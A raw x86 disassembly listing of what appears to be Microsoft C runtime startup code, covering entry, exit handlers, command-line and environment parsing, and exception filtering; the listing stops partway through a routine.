  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
